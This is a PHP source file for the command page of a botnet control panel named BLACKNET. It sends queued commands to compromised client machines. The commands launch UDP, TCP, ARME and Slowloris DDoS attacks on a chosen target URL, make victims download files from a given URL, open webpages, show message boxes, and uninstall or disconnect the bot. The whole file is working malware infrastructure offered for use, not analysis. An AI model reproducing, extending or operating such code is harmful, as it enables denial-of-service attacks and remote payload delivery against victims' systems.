<?php
require "classes/database.php";
include 'classes/clients.php';
include 'session.php';
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
        <link rel="shortcut icon" href="favico.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>BLACKNET - Execute Command</title>
    <link href="asset/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="asset/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/css/sb-admin.css" rel="stylesheet">
  </head>
  <body id="page-top">
    <nav class="navbar navbar-toggleable-md navbar-dark bg-dark static-top">
      <a class="navbar-brand mr-1" href="index.php"><img src="favico.png" width="30" height="30" alt="">BLACKNET - v0.1  </a>
    <span class="navbar-text">
     Welcome <?php echo $login_session; ?> - <a href="logout.php">Logout</a>
    </span>
    </nav>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Command Menu</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              Command Menu
            </div>
            <div class="card-body">
<?php
if (!isset($_GET['command']))
{
    echo 'You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a>';
} else {

}

    $client = new Clients;
if (isset($_GET['delete'])) {
    $clientHWD = GetFilter(implode(',', $_GET['delete']));
}



        $command = $_GET['command'];
        switch ($command)
        {
            case "Select Command":
                echo 'You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a>';
                break;

            case "Uninstall":
                Send($clientHWD, "Uninstall");
                $msg = $client->removeClient($clientHWD);
                echo 'Clinet Has Been Removed';

            break;
            case "DDOS Attack":

                include "menus/ddos_attack.html";

                if ($_SERVER['REQUEST_METHOD'] == "POST"){

                    if ($_POST['attacktype'] == "UDP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|UDPAttack|BN|" . $_POST['TargetURL']);
                    }
                    else if ($_POST['attacktype'] == "TCP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|TCPAttack|BN|" . $_POST['TargetURL']);
                    }
                    else if ($_POST['attacktype'] == "ARME Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|ARMEAttack|BN|" . $_POST['TargetURL']);
                    }
                    else
                    {
                        Send($clientHWD, "StartDDOS|BN|SlowlorisAttack|BN|" . $_POST['TargetURL']);
                    }
                    echo 'Command Has Been Send';
                }

                break;
                
            case "Upload File":

                include 'menus/upload.html';

                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "UploadFile|BN|" . $_POST['FileURL'] . "|BN|" . $_POST['Name']);
                    echo 'Command Has Been Send';
                }

                break;

            case "Ping":
                Send($clientHWD, "Ping");
                echo 'Command Has Been Send';
                break;

            case "Show Messagebox":
                include "menus/messagebox.html";

                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "ShowMessageBox|BN|" . $_POST['Content'] . "|BN|" . $_POST['MessageTitle'] . "|BN|" . $_POST['msgicon'] . "|BN|" . $_POST['msgbutton']);
                    echo 'Command Has Been Send';
                }

                break;

            case "Open Webpage":
                include "menus/openpage.html";

                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "OpenPage|BN|" . $_POST['Weburl']);
                    echo 'Command Has Been Send';
                }

                break;

            case "Close Connection":
                    $client->updateStatus($clientHWD,"Offline");
                    Send($clientHWD, 'Close');
                    echo 'Command Has Been Send';
                break;

            case "DDOS Linux":
                include 'menus/ddoslinux.html';
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "StartDDOS|BN|" . $_POST['TargetURL']);
                    echo 'Command Has Been Send To All Clients';
                }
                break;

            case "Print Linux":
                include "menus/printmsg.html";
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "PrintMessage|BN|" . $_POST['InputMessage']);
                    echo 'Command Has Been Send';
                }

                break;

                default:
                    echo 'Incorrect Command !!';
                    break;
            }

        function Send($USER, $Command){
            $client = new Clients;
            $client->updateCommands($USER,$Command);
        }

          function GetFilter($value){
            $step1 = trim($value);
            $step2 = strip_tags($step1);
            $step3 = htmlspecialchars($step2);
            return $step3;
          }

?>

              </div>
        </form>
        </div>
      </div>
    </div>
    <a class="scroll-to-top rounded" href="#page-top">
      <i class="fas fa-angle-up"></i>
    </a>
    <script src="asset/vendor/jquery/jquery.min.js"></script>
    <script src="asset/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="asset/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/js/sb-admin.min.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
  </body>
</html>